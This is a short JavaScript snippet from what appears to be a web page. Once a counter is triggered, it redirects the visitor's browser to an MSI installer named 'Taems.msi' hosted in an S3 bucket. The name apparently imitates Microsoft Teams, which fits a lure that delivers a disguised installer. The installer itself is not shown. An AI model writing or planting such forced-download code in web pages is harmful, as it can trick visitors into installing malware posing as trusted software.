function loadUrl()
{
	if(num>=1)
	{
		var url="https://taems1.s3.us-east-1.amazonaws.com/Taems.msi";
		window.location=url;
	}
}

var num=0;
function getLoad()
{
	num++;
}
